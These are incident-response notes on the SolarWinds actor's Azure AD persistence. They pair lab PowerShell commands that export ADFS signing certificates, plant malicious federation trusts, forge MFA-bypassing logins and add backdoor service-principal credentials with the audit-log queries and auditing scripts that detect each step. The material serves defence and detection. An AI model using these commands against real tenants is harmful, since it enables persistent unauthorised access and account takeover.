# Azure AD Incident Response

Rough notes for understanding the modifications the Solarwinds actor made to Azure AD to facilitate long-term access. The two techniques were observed: 
* Abusing federation trusts - adding new federation trusts, modifying existing federation trusts to add new token-signing certificates
* Abusing service principals - adding credentials to existing service principals, adding new service principals with credentials, adding permissions to service principals and applications to access Microsoft Graph API

Also on a third technique the actor was observed using to facilite long term access, stealing ADFS token-signing certificates to forge SAML tokens.

- [Notes for simulating attacks in a lab](#notes-for-simulating-attacks-in-a-lab)
  * [Exporting an ADFS certificate](#exporting-an-adfs-certificate)
  * [Modifying an existing federation trust](#modifying-an-existing-federation-trust)
  * [Adding a malicious federation trust](#adding-a-malicious-federation-trust)
  * [Adding credentials to a service principle](#adding-credentials-to-a-service-principle)
    - [Certificate](#certificate)
    - [Password](#password)
  * [Creating a new service principle](#creating-a-new-service-principle)
- [Auditing for backdoors](#auditing-for-backdoors)
  * [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
  * [Commands to manually service principals with credentials](#commands-to-manually-service-principals-with-credentials)
  * [Commands to manually search for service principals with credentials and risky permissions](#commands-to-manually-search-for-service-principals-with-credentials-and-risky-permissions)
  * [Data sources](#data-sources)
  * [Other useful commands](#other-useful-commands)
- [Further references](#further-references)

Background reading on defending against the threat: 
* [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft blog on Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Microsoft blog on Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)

## Notes for simulating attacks in a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the applicaiton. 

### Exporting an ADFS certificate

PS> Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  

Export the ADFS configuration for more information: 

PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  

You can also use ADFSDump https://github.com/fireeye/ADFSDump

### Modifying an existing federation trust


PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  

AuditLogs | where OperationName =~ "Set federation settings on domain"

### Adding a malicious federation trust

PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  

Creates the Azure AD audit log:
AuditLogs | where OperationName =~ "Set domain authentication"

### Adding credentials to a service principle 

#### Certificate 

PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  

Creates the Azure AD audit log:
AuditLogs | where OperationName =~ "Add service principal credentials"

#### Password

PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  

Creates the log:
AuditLogs | where OperationName =~ "Add service principal credentials"

### Creating a new service principle 

PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  

## Auditing for backdoors 

PS> Install-module azureadpreview  
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement  
PS> Connect-ExchangeOnline  

PS> Install-module MSOnline  
PS> Connect-MsolService  

PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing   
PS> .\Sparrow.ps1  

PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/blob/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1  

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** (unclear if these can be changed, Exchange Online PowerShell APIs to configure these state they only work for on-prem Exchange)

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually service principals with credentials

PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   

### Commands to manually search for service principals with credentials and risky permissions 

See scripts output in Sparrow and CRT tool.  

PS> # Get Service Principal using objectId  
PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    

PS> # Get Azure AD App role assignments using objectID of the Service Principal (users)  
PS> $assignments = Get-AzureADServiceAppRoleAssignment -ObjectId $sp.ObjectId -All $true   

PS> # Get all delegated permissions for the service principal  
PS> $spOAuth2PermissionsGrants = Get-AzureADOAuth2PermissionGrant -All $true| Where-Object {$\_.clientId -eq $sp.ObjectId} | Format-List  

PS> # Get all application permissions for the service principal  
PS> $spApplicationPermissions = Get-AzureADServiceAppRoleAssignedTo -ObjectId $sp.ObjectId -All $true | Where-Object { $\_.PrincipalType -eq "ServicePrincipal" }  
App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

### Data sources

Data sources from blog SolarWinds Post-Compromise Hunting with Azure Sentinel:
* Azure Active Directory logs - audit logs, sign-in logs (if not already onboarded to Sentinel retained for 30 days in Azure Azure Active Directory)
* Microsoft 365 Defender - includes MDATP raw data
* Microsoft Defender for Endpoint
* Office 365 - OfficeActivity (Exchange Online, OneDrive, Teams) (if not already onboarded to Sentinel retained for 90 days E3 / 1 year E5 in the Unified Audit Logs. These have to be manually enabled by the organisation.)
* Windows security events - with process creation auditing configured on endpoints (could be re-written into rules based on DeviceProcessEvents / Defender for Endpoint)
* AWS
* AzureMonitor(IIS)

Sentinel connectors:
* AzureActiveDirectory  
  * Azure AD Audit Logs
  * Azure AD Sign-In Logs
  * Azure AD Managed Identity Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Non-Interactive User Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Service Principal Sign-In Logs (Preview) (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Provisioning Logs (Needs to be configured in Azure AD diagnostic settings)
  * Azure AD Risky Sign-In events (Needs to be configured in Azure AD diagnostic settings)
* SecurityEvents  
* Office365  
* Microsoft 365 Defender  

### Other useful commands

PS> Get-AADIntLoginInformation -Domain domain.com  
PS> Get-AzureADTenantDetail | Select *  

## Further references

[Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/)
* There is a good list in here of what to search for in Azure AD that goes further than the above including:
  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
  * Reviewing Azure B2B external identities’ access to the Azure portal 
  * Review environment for overly privileged service accounts that may have access to Azure

[Microsoft blog explaining the difference between service principals and applicaitons](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)

[Microsoft video on modern authentication methods including ADFS and SAML](https://twitter.com/SwiftOnSecurity/status/1217942428243632128?s=20) 

[FireEye blog on carrying out attacks](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)

https://www.youtube.com/watch?v=fpUZJxFK72k  

https://dirkjanm.io/talks/  

https://www.youtube.com/watch?v=SG2ibjuzRJM  

https://www.youtube.com/watch?v=JEIR5oGCwdg  

https://www.youtube.com/watch?v=LufXEPTlPak  

https://vimeo.com/214855977  

https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/  

https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html

https://www.youtube.com/watch?v=tJkjOnxcw6w

https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf

https://insen.github.io/blog/2017/09/24/Azure-AAD-with-Office-365/

